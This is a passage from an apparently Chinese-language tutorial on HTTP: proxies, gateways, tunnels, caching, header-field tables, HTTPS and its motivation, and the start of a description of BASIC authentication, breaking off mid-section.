<h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>&emsp;&emsp;代理服务器的基本行为就是<strong>接收客户端发送的请求后转发给其他服务器</strong>。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。<br>&emsp;&emsp;持有资源实体的服务器被称为源服务器。从源服务器返回的响应经过代理服务器后再传给客户端。  </p>
<p>为什么要使用代理？</p>
<ul>
<li>利用缓存技术减少网络带宽的流量。</li>
<li>组织内部针对特定网站的访问控制，以获取访问日志为主要目的</li>
</ul>
<blockquote>
<p>&emsp;&emsp;代理转发响应时，缓存代理会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。</p>
</blockquote>
<h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>&emsp;&emsp;网关的工作机制和代理十分相似。而<strong>网关能使通信线路上的服务器提供非 HTTP 协议服务</strong>。</p>
<figure class="image-box">
                <img src="16f272b47fb05d3c.png" alt title class>
                <p></p>
            </figure>

<p>为什么要用网关？<br>&emsp;&emsp;利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用 SQL 语句查询数据。另外，在 Web 购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。</p>
<h4 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h4><p>&emsp;&emsp;隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。<br>&emsp;&emsp;隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</p>
<h3 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h3><p>&emsp;&emsp;缓存是指<strong>代理服务器或客户端本地磁盘内保存的资源副本</strong>。利用缓存可减少对源服务器的访问，因此也就节省了通信流量和通信时间。<br>&emsp;&emsp;缓存服务器的优势在于利用缓存可避免多次从源服务器转发资源。因此客户端可就近从缓存服务器上获取资源，而源服务器也不必多次处理相同的请求了。</p>
<h4 id="缓存有效期"><a href="#缓存有效期" class="headerlink" title="缓存有效期"></a>缓存有效期</h4><p>&emsp;&emsp;即便缓存服务器内有缓存，也不能保证每次都会返回对同资源的请求。因为这关系到被缓存资源的有效性问题。<br>&emsp;&emsp;当遇上<strong>源服务器上的资源更新</strong>时，如果还是使用不变的缓存，那就会演变成返回更新前的“旧”资源了。<br>&emsp;&emsp;即使存在缓存，也会因为客户端的要求、缓存的有效期等因素，向源服务器确认资源的有效性。若判断缓存失效，缓存服务器将会再次从源服务器上获取“新”资源。</p>
<h4 id="客户端的缓存"><a href="#客户端的缓存" class="headerlink" title="客户端的缓存"></a>客户端的缓存</h4><p>&emsp;&emsp;缓存不仅可以存在于缓存服务器内，还可以存在客户端浏览器中。<br>&emsp;&emsp;浏览器缓存如果有效，就不必再向服务器请求相同的资源了，可以直接从本地磁盘内读取。比如在系列 1 中提到过，DNS 解析的时候，当在浏览器输入地址后，不会直接进行解析，会在本地缓存中对比是否有访问对象的 IP 地址，有的话就不用 DNS 解析，直接就可以拿到 IP 地址。</p>
<h2 id="HTTP-报文首部"><a href="#HTTP-报文首部" class="headerlink" title="HTTP 报文首部"></a>HTTP 报文首部</h2><figure class="image-box">
                <img src="16f2744ee407b0bd.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>请求报文首部组成<br>请求报文 = 报文首部 + 报文主体<br>报文首部 = （方法 + URI + HTTP 版本） + （请求首部字段 + 通用首部字段 + 实体首部字段）</p>
</blockquote>
<blockquote>
<p>响应报文首部组成<br>响应报文 = 报文首部 + 主体<br>报文首部 = （HTTP 版本 + 状态码） + （响应首部字段 + 通用首部字段 + 实体首部字段）</p>
</blockquote>
<h3 id="首部字段类型分类"><a href="#首部字段类型分类" class="headerlink" title="首部字段类型分类"></a>首部字段类型分类</h3><ul>
<li>请求首部字段</li>
<li>响应首部字段</li>
<li>通用首部字段</li>
<li>实体首部字段</li>
</ul>
<h3 id="首部字段概述"><a href="#首部字段概述" class="headerlink" title="首部字段概述"></a>首部字段概述</h3><ul>
<li><p>首部字段的作用：<br>&emsp;&emsp;使用首部字段是为了<strong>给浏览器和服务器提供报文主体大小、所使用的语言、认证信息</strong>等内容。</p>
</li>
<li><p>首部字段的结构：<br>&emsp;&emsp;HTTP 首部字段是由首部字段名和字段值构成的，中间用冒号<code>:</code>分隔。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首部字段名： 字段值</span><br><span class="line"></span><br><span class="line">例如表示报文主体的对象类型：</span><br><span class="line">Content-Type: text/html</span><br></pre></td></tr></table></figure>
</li>
<li><p>字段值对应单个 HTTP 首部字段可以有多个值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Keep-Alive: timeout=15, max=100</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p><strong>若 HTTP 首部字段重复了会如何？</strong><br>&emsp;&emsp;当 HTTP 报文首部中出现了两个或两个以上具有相同首部字段名时会怎么样？这种情况在规范内尚未明确，根据浏览器内部处理逻辑的不同，结果可能并不一致。有些浏览器会优先处理第一次出现的首部字段，而有些则会优先处理最后出现的首部字段。</p>
</blockquote>
<h3 id="请求首部字段"><a href="#请求首部字段" class="headerlink" title="请求首部字段"></a>请求首部字段</h3><p>&emsp;&emsp;请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于<strong>补充请求的附加信息、客户端信息、对响应内容相关的优先级</strong>等内容。</p>
<table>
<thead>
<tr>
<th>请求首部字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td><em><code>text/html</code><em>，</em><code>image/jpeg</code><em>，</em><code>video/mpeg</code><em>，</em><code>application/octet-stream</code></em> 客户端可以接收的媒体类型（文本文件，图片文件，视频文件，二进制文件）。</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td><em><code>iso-8859-5</code><em>，</em><code>unicode-1-1;q=0.8</code></em> 能正确接收的字符集。</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>客户端能支持的内容编码（可多个）：<em><code>gzip</code></em>，<em><code>compress</code></em>，<em><code>deflate</code></em>。</td>
</tr>
<tr>
<td>Accept-Language</td>
<td><em><code>zh-cn</code><em>，</em><code>zh;q=0.7</code><em>，</em><code>en-us</code><em>，</em><code>en;q=0.3</code></em> 客户端能够处理的语言。</td>
</tr>
<tr>
<td>Authorization</td>
<td>认证信息。当出现 401 时将其添加到请求头中便可认证。</td>
</tr>
<tr>
<td>Expect</td>
<td>期待服务端的指定行为。</td>
</tr>
<tr>
<td>From</td>
<td>告知服务器使用用户代理的用户的电子邮件地址（使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式）。</td>
</tr>
<tr>
<td>Host</td>
<td>（必须存在于请求头中）告知服务器，请求的资源所处的互联网主机名和端口号（<strong>当一个服务器下部署着多个域名的时候需指定，不然分不清请求的是哪一个域名</strong>）。</td>
</tr>
<tr>
<td>If-Match</td>
<td>形如 if-xxx 的格式，称为<strong>条件请求</strong>。服务器接收到条件后，只有判断指定条件为真，才会接受请求。</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>告知服务器若 <em><code>If-Modified-Since</code></em> 字段值早于资源的更新时间，则希望能处理该请求。而在指定 <em><code>If-Modified-Since</code></em> 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>资源未修改返回 304（通过对比 <em><code>ETag</code></em>）。</td>
</tr>
<tr>
<td>If-Range</td>
<td>告知服务器若指定的 <em><code>If-Range</code></em> 字段值（<em><code>ETag</code></em> 值或者时间）和请求资源的 <em><code>ETag</code></em> 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>首部字段 <em><code>If-Unmodified-Since</code></em> 和首部字段 <em><code>If-Modified-Since</code></em> 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>限制可被代理及网关转发的次数。</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>向代理服务器发送验证信息（<strong>这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 <em><code>Authorization</code></em> 可起到相同作用</strong>）。</td>
</tr>
<tr>
<td>Range</td>
<td><em><code>bytes=5001-10000</code></em> 请求某个内容的一部分，配合 <em><code>If-Range</code></em> 使用。</td>
</tr>
<tr>
<td>Referer</td>
<td>告知服务器请求的原始资源的 URI（客户端一般都会发送 <em><code>Referer</code></em> 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 <em><code>Referer</code></em> 转发给其他服务器，则有可能导致保密信息的泄露）。</td>
</tr>
<tr>
<td>TE</td>
<td><em><code>gzip</code><em>，</em><code>deflate;q=0.5</code></em> 告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 <em><code>Accept-Encoding</code></em> 的功能很相像，但是用于传输编码。</td>
</tr>
<tr>
<td>User-Agent</td>
<td>将<strong>发起请求的浏览器</strong>和<strong>用户代理名称</strong>等信息<strong>传达给服务器</strong>。</td>
</tr>
</tbody></table>
<h3 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><p>&emsp;&emsp;响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于<strong>补充响应的附加信息、服务器信息，以及对客户端的附加要求</strong>等信息。</p>
<table>
<thead>
<tr>
<th>响应首部字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Accept-Ranges</td>
<td>告知客户端自己能否处理范围请求。能 <em><code>bytes</code></em>，否 <em><code>none</code></em>。</td>
</tr>
<tr>
<td>Age</td>
<td>告知客户端，<strong>源服务器</strong>在多久前创建了响应。若创建该响应的服务器是<strong>缓存服务器</strong>，<em><code>Age</code></em> 值是指缓存后的响应再次发起认证到认证完成的时间值（<strong>资源在代理缓存中存在的时间</strong>）。</td>
</tr>
<tr>
<td>ETag</td>
<td>资源标识，资源发生变化时标识也会发生改变。</td>
</tr>
<tr>
<td>Location</td>
<td>使用首部字段 <em><code>Location</code></em> 可以将响应接收方引导至某个与请求 URI 位置不同的资源。基本上，该字段会配合 3xx:Redirection 的响应，提供重定向的 URI。几乎所有的浏览器在接收到包含首部字段 <em><code>Location</code></em> 的响应后，都会强制性地尝试对已提示的重定向资源的访问。</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>把由代理服务器所要求的认证信息发送给客户端。</td>
</tr>
<tr>
<td>Retry-After</td>
<td>告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应</td>
</tr>
<tr>
<td>Server</td>
<td><em><code>Apache/2.2.6 (Unix) PHP/5.2.5</code></em> 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</td>
</tr>
<tr>
<td>Vary</td>
<td>对缓存进行控制。源服务器会向代理服务器传达关于本地缓存使用方法的命令。</td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 <em><code>WWW-Authenticate</code></em>。</td>
</tr>
</tbody></table>
<h3 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h3><p>&emsp;&emsp;通用首部字段是指，请求报文和响应报文双方都会使用的首部。</p>
<table>
<thead>
<tr>
<th>通用首部字段</th>
<th>说明（请求报文和响应报文都会用到）</th>
</tr>
</thead>
<tbody><tr>
<td>Cache-Control</td>
<td>表示是否能缓存的指令。<em><code>public</code></em>（客户端、代理服务器都可利用缓存），<em><code>no-cache</code></em>（防止从缓存中返回过期的资源），<em><code>no-store</code></em>（暗示包含机密信息，不允许缓存），<em><code>s-maxage</code></em>，<em><code>max-age</code></em>（资源可缓存最大时间 秒）。</td>
</tr>
<tr>
<td>Connection</td>
<td><strong>不再转发的首部字段名</strong>（控制不再转发给代理的首部字段），<em><code>close</code></em>（关闭持续连接），<em><code>Keep-Alive</code></em>（在 HTTP/1.0 上开启持续连接，1.1 默认持续连接所以不需要）。</td>
</tr>
<tr>
<td>Data</td>
<td>表明创建 HTTP 报文的日期和时间。</td>
</tr>
<tr>
<td>Pragma</td>
<td><em><code>no-cache</code></em>（只用于请求报文，客户端要求中间服务器不返回缓存的资源）。</td>
</tr>
<tr>
<td>Trailer</td>
<td>事先说明在报文主体后记录了哪些首部字段。</td>
</tr>
<tr>
<td>Transfer-Encoding</td>
<td><em><code>chunked</code></em>（规定了传输报文主体时采用的编码方式）。</td>
</tr>
<tr>
<td>Upgrade</td>
<td>检测 HTTP 协议及其他协议是否可使用更高的版本进行通信。</td>
</tr>
<tr>
<td>Via</td>
<td>追踪客户端与服务器之间的请求和响应报文的传输路径。报文经过代理或网关时，会先在首部字段 <em><code>Via</code></em> 中附加该服务器的信息，然后再进行转发。首部字段 <em><code>Via</code></em> 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。</td>
</tr>
<tr>
<td>Warning</td>
<td>告知用户一些与缓存相关的问题的警告。</td>
</tr>
</tbody></table>
<h3 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><p>&emsp;&emsp;实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于<strong>补充内容的更新时间等与实体相关的信息</strong>。<br>&emsp;&emsp;在请求和响应两方的 HTTP 报文中都含有与实体相关的首部字段。</p>
<table>
<thead>
<tr>
<th>实体首部字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Allow</td>
<td><em><code>GET</code><em>，</em><code>HEAD</code></em> 通知客户端能够支持 <em><code>Request-URI</code></em> 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码 405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 <em><code>Allow</code></em> 后返回。</td>
</tr>
<tr>
<td>Content-Encoding</td>
<td><em><code>gzip</code></em>，<em><code>compress</code></em>，<em><code>deflate</code></em>，<em><code>identity</code></em>。告知客户端服务器对实体的主体部分选用的内容编码方式。<strong>内容编码是指在不丢失实体信息的前提下所进行的压缩</strong>。</td>
</tr>
<tr>
<td>Content-Language</td>
<td>告知客户端，实体主体使用的自然语言（指中文或英文等语言）。</td>
</tr>
<tr>
<td>Content-Length</td>
<td>表明了实体主体部分的大小（单位是字节）。</td>
</tr>
<tr>
<td>Content-Location</td>
<td>返回数据的备用地址。</td>
</tr>
<tr>
<td>Content-MD5</td>
<td>首部字段 <em><code>Content-MD5</code></em> 是一串由 MD5 算法生成的值，其目的在于<strong>检查报文主体在传输过程中是否保持完整，以及确认传输到达</strong>。</td>
</tr>
<tr>
<td>Content-Range</td>
<td><em><code>bytes 5001-10000/10000</code></em> 告知客户端作为响应返回的实体的哪个部分符合范围请求。</td>
</tr>
<tr>
<td>Content-Type</td>
<td><em><code>application/json;charset=UTF-8</code></em> 说明了实体主体内对象的媒体类型。</td>
</tr>
<tr>
<td>Expires</td>
<td>缓存服务器在接收到含有首部字段 <em><code>Expires</code></em> 的响应后，表示可以缓存到指定日期，到达指定日期，缓存服务器会向源服务器请求更新资源；同时也会告知客户端。</td>
</tr>
<tr>
<td>Last-Modified</td>
<td>指明资源最终修改的时间。</td>
</tr>
</tbody></table>
<h3 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 Cookie 服务的首部字段</h3><p>&emsp;&emsp;管理服务器与客户端之间状态的 Cookie，虽然没有被编入标准化 HTTP/1.1 的 RFC2616 中，但在 Web 网站方面得到了广泛的应用。<br>&emsp;&emsp;Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该 Web 网站时，可通过通信方式取回之前存放的 Cookie。<br>&emsp;&emsp;调用 Cookie 时，由于可校验 Cookie 的<strong>有效期</strong>，以及发送方的<strong>域、路径、协议</strong>等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web站点和攻击者的攻击而泄露。</p>
<table>
<thead>
<tr>
<th>为 Cookie 服务的首部字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Set-Cookie</td>
<td><em><code>name</code></em>：赋予 Cookie 的名称和其值；<em><code>expires</code></em>：Cookie 的有效期（若不指定则默认为浏览关闭前为止）；<em><code>path</code></em>：将服务器上的文件目录作为 Cookie 的适用对象；<em><code>domain = 域名</code></em>：作为 Cookie 适用对象的域名；<em><code>secure</code></em>：仅在 HTTPS 安全通行时才会发送 Cookie；<em><code>HttpOnly</code></em>：加以限制，使 Cookie 不能被 JavaScript 脚本访问。</td>
</tr>
<tr>
<td>Cookie</td>
<td><em><code>Cookie: status=enable</code></em> 首部字段 <em><code>Cookie</code></em> 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个 Cookie 时，同样可以以多个 Cookie 形式发送。</td>
</tr>
</tbody></table>
<h3 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h3><p>&emsp;&emsp;HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。</p>
<table>
<thead>
<tr>
<th>其他首部字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>X-Frame-Options</td>
<td><em><code>DENY(拒绝);SAMEORIGIN(仅同源域名下许可)</code></em>：用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</td>
</tr>
<tr>
<td>X-XSS-Protection</td>
<td><em><code>0</code></em> ：将 XSS 过滤设置成无效状态；<em><code>1</code></em> ：将 XSS 过滤设置成有效状态。它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</td>
</tr>
<tr>
<td>DNT</td>
<td><em><code>0</code></em> ：同意被追踪；<em><code>1</code></em> ：拒绝被追踪。DNT 是 Do NotTrack 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。由于首部字段 <em><code>DNT</code></em> 的功能具备有效性，所以 Web 服务器需要对 <em><code>DNT</code></em> 做对应的支持。</td>
</tr>
<tr>
<td>P3P</td>
<td>通过利用 P3P（ThePlatform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。</td>
</tr>
</tbody></table>
<hr>
<h1 id="HTTPS-与追加协议"><a href="#HTTPS-与追加协议" class="headerlink" title="HTTPS 与追加协议"></a>HTTPS 与追加协议</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;本篇文章主要讲 HTTPS，HTTP 和 HTTPS 区别，认证，SPDY 的 AJAX 与 Comet，Websocket。</p>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><h3 id="HTTP-的缺点"><a href="#HTTP-的缺点" class="headerlink" title="HTTP 的缺点"></a>HTTP 的缺点</h3><h4 id="通信使用明文可能会被窃听"><a href="#通信使用明文可能会被窃听" class="headerlink" title="通信使用明文可能会被窃听"></a>通信使用明文可能会被窃听</h4><p>&emsp;&emsp;由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p>
<blockquote>
<p>&emsp;&emsp;按 TCP/IP 协议族的工作机制，通信内容在<strong>所有</strong>的通信线路上都有可能遭到窥视。</p>
</blockquote>
<blockquote>
<p>&emsp;&emsp;即使已经过加密处理的通信，也会被窥视到通信内容，这点和未加密的通信是相同的。只是说如果通信经过加密，就有可能让人无法破解报文信息的含义，但加密处理后的报文信息本身还是会被看到的。</p>
</blockquote>
<h5 id="如何防止被窃听"><a href="#如何防止被窃听" class="headerlink" title="如何防止被窃听"></a>如何防止被窃听</h5><p>最为普及的就是加密技术。</p>
<ul>
<li>通信的加密<br>&emsp;&emsp;HTTP 协议中没有加密机制，但可以通过和 <strong>SSL</strong>（Secure Socket Layer，安全套接层）或 <strong>TLS</strong>（Transport Layer Security，安全传输层协议）的组合使用，加密 HTTP 的通信内容。<br>&emsp;&emsp;<strong>用 SSL 建立安全通信线路之后，就可以在这条线路上进行 HTTP 通信了。与 SSL 组合使用的 HTTP 被称为 HTTPS（HTTP Secure，超文本传输安全协议）或 HTTPover SSL。</strong></li>
<li>内容的加密<br>&emsp;&emsp;由于 HTTP 协议中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把 HTTP 报文里所含的内容进行加密处理。<br>&emsp;&emsp;诚然，为了做到有效的内容加密，前提是要求客户端和服务器同时具备加密和解密机制。主要应用在 Web 服务中。有一点必须引起注意，由于该方式不同于 SSL 或 TLS 将整个通信线路加密处理，所以内容仍有被篡改的风险。</li>
</ul>
<h4 id="不验证通信方的身份"><a href="#不验证通信方的身份" class="headerlink" title="不验证通信方的身份"></a>不验证通信方的身份</h4><p>&emsp;&emsp;HTTP 协议中的请求和响应不会对通信方进行确认。</p>
<h5 id="任何人都可以发起请求"><a href="#任何人都可以发起请求" class="headerlink" title="任何人都可以发起请求"></a>任何人都可以发起请求</h5><p>&emsp;&emsp;在 HTTP 协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外，服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的IP地址和端口号没有被 Web 服务器设定限制访问的前提下）。不确认通信方，会存在以下各种隐患。</p>
<ul>
<li>无法确定请求发送至目标的 Web 服务器是否是按真实意图返回响应的那台服务器。有可能是已伪装的 Web 服务器。</li>
<li>无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是已伪装的客户端。</li>
<li>无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通信的权限。</li>
<li>无法判定请求是来自何方、出自谁手。</li>
<li>即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS 攻击（Denial of Service，拒绝服务攻击）。</li>
</ul>
<h5 id="如何验证身份呢"><a href="#如何验证身份呢" class="headerlink" title="如何验证身份呢"></a>如何验证身份呢</h5><p>&emsp;&emsp;虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段，可用于确定方。<br>&emsp;&emsp;证书由值得信任的第三方机构颁发，用以证明服务器和客户端是实际存在的。另外，伪造证书从技术角度来说是异常困难的一件事。所以只要能够确认通信方（服务器或客户端）持有的证书，即可判断通信方的真实意图。</p>
<h4 id="报文可能会被篡改"><a href="#报文可能会被篡改" class="headerlink" title="报文可能会被篡改"></a>报文可能会被篡改</h4><p>&emsp;&emsp;由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。</p>
<blockquote>
<p>&emsp;&emsp;比如，从某个 Web 网站上下载内容，是无法确定客户端下载的文件和服务器上存放的文件是否前后一致的。文件内容在传输途中可能已经被篡改为其他的内容。即使内容真的已改变，作为接收方的客户端也是觉察不到的。像这样，请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middleattack, MITM）。</p>
</blockquote>
<h5 id="如何防止被篡改"><a href="#如何防止被篡改" class="headerlink" title="如何防止被篡改"></a>如何防止被篡改</h5><p>&emsp;&emsp;<strong>虽然有使用 HTTP 协议（头部字段<code>Content-MD5</code>）确定报文完整性的方法，但事实上并不便捷、可靠。</strong>其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法。</p>
<h3 id="HTTPS-HTTP-加密-认证-完整性保护"><a href="#HTTPS-HTTP-加密-认证-完整性保护" class="headerlink" title="HTTPS = HTTP + 加密 + 认证 + 完整性保护"></a>HTTPS = HTTP + 加密 + 认证 + 完整性保护</h3><p>&emsp;&emsp;如果在 HTTP 协议通信过程中使用未经加密的明文，比如在Web页面中输入信用卡号，如果这条通信线路遭到窃听，那么信用卡号就暴露了。<br>&emsp;&emsp;另外，对于 HTTP 来说，服务器也好，客户端也好，都是没有办法确认通信方的。因为很有可能并不是和原本预想的通信方在实际通信。并且还需要考虑到接收到的报文在通信途中已经遭到篡改这一可能性。<br>&emsp;&emsp;为了统一解决上述这些问题，需要在 HTTP 上再加入加密处理和认证等机制。<strong>我们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。</strong></p>
<h4 id="HTTPS-是身披-SSL-外壳的-HTTP"><a href="#HTTPS-是身披-SSL-外壳的-HTTP" class="headerlink" title="HTTPS 是身披 SSL 外壳的 HTTP"></a>HTTPS 是身披 SSL 外壳的 HTTP</h4><p>&emsp;&emsp;HTTPS 并非是应用层的一种新协议。只是 <strong>HTTP 通信接口部分</strong>用 SSL（Secure Socket Layer）和 TLS（TransportLayer Security）协议代替而已。<br>&emsp;&emsp;通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。</p>
<figure class="image-box">
                <img src="16f370728f5c8d1a.png" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。</p>
</blockquote>
<h3 id="HTTPS-和-HTTP-的区别"><a href="#HTTPS-和-HTTP-的区别" class="headerlink" title="HTTPS 和 HTTP 的区别"></a>HTTPS 和 HTTP 的区别</h3><ul>
<li>HTTPS 协议需要到 CA（证书颁发机构）申请证书，一般免费证书很少，需要交费。</li>
<li>HTTP 协议运行在 TCP 之上，所有传输的内容都是明文，HTTPS 运行在 SSL/TLS 之上，SSL/TLS 运行在 TCP 之上，所有传输的内容都经过加密的。</li>
<li>HTTP 和 HTTPS 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。</li>
<li>HTTP 的连接很简单，是无状态的；HTTPS 协议是由 HTTP+SSL 协议构建的可进行加密传输、身份认证的网络协议，可以有效的防止运营商劫持，解决了防劫持的一个大问题，比 HTTP 协议安全。</li>
</ul>
<h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="何为认证"><a href="#何为认证" class="headerlink" title="何为认证"></a>何为认证</h3><p>&emsp;&emsp;计算机本身无法判断坐在显示器前的使用者的身份。进一步说，也无法确认网络的那头究竟有谁。可见，为了弄清究竟是谁在访问服务器，就得让对方的客户端自报家门。<br>&emsp;&emsp;为确认用户是否真的具有访问系统的权限，就需要核对“登录者本人才知道的信息”、“登录者本人才会有的信息”  </p>
<p>核对的信息通常是指以下这些：</p>
<ul>
<li>密码：只有本人才会知道的字符串信息。</li>
<li>动态令牌：仅限本人持有的设备内显示的一次性密码。</li>
<li>数字证书：仅限本人（终端）持有的信息。</li>
<li>生物认证：指纹和虹膜等本人的生理信息。</li>
<li>IC 卡等：仅限本人持有的信息。</li>
</ul>
<h4 id="HTTP-1-1-使用的认证方式"><a href="#HTTP-1-1-使用的认证方式" class="headerlink" title="HTTP/1.1 使用的认证方式"></a>HTTP/1.1 使用的认证方式</h4><ul>
<li>BASIC 认证（基本认证）</li>
<li>DIGEST 认证（摘要认证）</li>
<li>SSL 客户端认证</li>
<li>FormBase 认证（基于表单认证）</li>
</ul>
<h3 id="BASIC-认证"><a href="#BASIC-认证" class="headerlink" title="BASIC 认证"></a>BASIC 认证</h3><p>&emsp;&emsp;BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式。即便是现在仍有一部分的网站会使用这种认证方式。是 Web 服务器与通信客户端之间进行的认证方式。</p>
<ul>
<li>步骤 1：当请求的资源需要 BASIC 认证时，服务器会随状态码 401 Authorization Required，返回带<code>WWW-Authenticate</code>首部字段的响应。该字段内包含认证的方式（BASIC）及<code>Request-URI</code>安全域字符串（realm）。</li>
<li>步骤 2：接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码构成，两者中间以冒号<code>:</code>连接后，再经过 Base64 编码处理。当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后，浏览器会自动完成到 Base64 编码的转换工作。</li>
<li>步骤 3：接收到包含首部字段<code>Authorization</code>请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含<code>Request-URI</code>资源的响应。</li>
</ul>
<blockquote>
